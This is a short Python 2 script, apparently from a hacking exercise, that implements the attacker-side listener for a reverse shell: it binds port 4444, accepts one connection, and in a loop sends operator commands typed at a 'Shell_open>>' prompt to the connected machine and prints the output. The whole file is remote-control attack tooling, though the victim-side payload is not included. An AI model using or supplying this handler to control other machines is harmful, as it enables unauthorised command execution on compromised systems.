import socket




class Listener:
    def __init__(self):
        data = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        data.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        data.bind(("localhost",4444))
        data.listen(1)
        print("[+] Waiting for incomins connections...")

        self.con,ac = data.accept()
    

    def run(self):
        while True:
            command = raw_input("Shell_open>> ")
            self.con.send(command)
            res = self.con.recv(1024)
            print(res)



if __name__=="__main__":
    L = Listener()
    L.run()

